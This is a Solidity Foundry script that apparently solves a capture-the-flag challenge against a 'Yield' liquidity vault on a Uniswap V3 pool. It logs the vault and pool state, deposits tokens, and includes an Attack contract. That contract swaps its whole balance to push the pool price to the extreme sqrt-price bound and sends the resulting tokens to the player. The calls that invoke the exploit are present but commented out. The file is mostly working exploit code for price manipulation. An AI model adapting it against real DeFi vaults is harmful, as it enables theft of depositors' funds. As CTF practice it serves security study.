// SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@openzeppelin-contracts-3.4.2/contracts/token/ERC20/IERC20.sol";


import {Yield } from "../src/Yield.sol";


contract YieldSolve is Script {
    Yield public yield = Yield(0x59CD84565A441D6551ecb87F7878F4b028AD8e8B);
    IUniswapV3Pool public pool = yield.pool();
    IERC20 public token0 = IERC20(pool.token0());
    IERC20 public token1 = IERC20(pool.token1());
    address player = vm.envAddress("PLAYER");

    // // Deploy
    // function setUp() external{
    //     
    // }
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        console.log("Yield : ", address(yield));
        console.log("Pool : ", address(pool));
        // console.log("token0 : ", address(token0));
        // console.log("token1 : ", address(token1));
        console.log("Pool balance of token0 : ", token0.balanceOf(address(pool)));
        console.log("Pool balance of token1 : ", token1.balanceOf(address(pool)));

        (uint160 sqrtPriceX96,int24 tick,,,,,) = pool.slot0();
        console.log("Pool tick : ", tick);
        console.log("Pool sqrtPriceX96 : ", uint256(sqrtPriceX96));
        // console.log("Token0 price in terms of Token1 : ", 1.0001**tick);
        // console.log("baseLower: ", yield.baseLower());
        // console.log("baseUpper: ", yield.baseUpper());
        // console.log("tickSpacing: ", yield.tickSpacing());

        (uint256 total0, uint256 total1) = yield.getTotalAmounts();
        console.log("total0: ", total0);
        console.log("total1: ", total1);
        console.log("Yield balance of token0 : ", token0.balanceOf(address(yield)));
        console.log("Yield balance of token1 : ", token1.balanceOf(address(yield)));
        console.log("Yield getBalance0() : ", yield.getBalance0());
        console.log("Yield getBalance1() : ", yield.getBalance1());
        console.log("Initial LP tokens : ", yield.totalSupply());
        console.log("Yield accruedProtocolFees0() : ", yield.accruedProtocolFees0());
        console.log("Yield accruedProtocolFees1() : ", yield.accruedProtocolFees1());


        console.log("Player balance of token0 : ", token0.balanceOf(address(player)));
        console.log("Player balance of token1 : ", token1.balanceOf(address(player)));
        console.log("Player balance of LP tokens : ", yield.balanceOf(address(player)));

        token0.approve(address(yield),  14 ether);
        token1.approve(address(yield), 15 ether);
        yield.deposit( 14 ether, 15 ether, 1, 1, player);
        // Attack attack = new Attack(address(yield), player);
        // Attack attack = Attack(0xf5420a93FCa0E520E319Dc3f05625c79613be6b0);
        // token0.transfer(address(attack), 2 ether);
        // token1.transfer(address(attack), 2 ether);
        // attack.exploit(true);
        // yield.withdraw(yield.balanceOf(player), 0, 0, player);

        
        (sqrtPriceX96,tick,,,,,) = pool.slot0();
        console.log("Pool tick : ", tick);
        console.log("Pool sqrtPriceX96 : ", uint256(sqrtPriceX96));
        (total0, total1) = yield.getTotalAmounts();
        console.log("total0: ", total0);
        console.log("total1: ", total1);
        console.log("Yield getBalance0() : ", yield.getBalance0());
        console.log("Yield getBalance1() : ", yield.getBalance1());
        console.log("Initial LP tokens : ", yield.totalSupply());

        console.log("Player balance of token0 : ", token0.balanceOf(address(player)));
        console.log("Player balance of token1 : ", token1.balanceOf(address(player)));
        console.log("Player balance of LP tokens : ", yield.balanceOf(address(player)));

        // console.log("isSolved() : ", yield.isSolved());
        vm.stopBroadcast();
    }
}

contract Attack {
    Yield public yield;
    IUniswapV3Pool public pool;
    IERC20 public token0;
    IERC20 public token1;
    address public player;
    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    constructor(address _yeild, address _player){
        yield = Yield(_yeild);
        pool = yield.pool();
        token0 = IERC20(pool.token0());
        token1 = IERC20(pool.token1());
        player = _player;
    }
    function exploit(bool zeroForOne) public {
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        if (zeroForOne){
            uint256 token0bal =  token0.balanceOf(address(this));
            token0.approve(address(pool), token0bal);
            pool.swap(player, true, int256(token0bal), MIN_SQRT_RATIO+1, "");
        }
        else {
            uint256 token1bal =  token1.balanceOf(address(this));
            token1.approve(address(pool), token1bal);
            pool.swap(player, false, int256(token1bal), MAX_SQRT_RATIO-1, "");
        }
        
        token0.transfer(player, token0.balanceOf(address(this)));
        token1.transfer(player, token1.balanceOf(address(this)));

    }
    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata data
    ) external  {
        require(msg.sender == address(pool));
        if (amount0Delta > 0) token0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) token1.transfer(msg.sender, uint256(amount1Delta));
    }
}
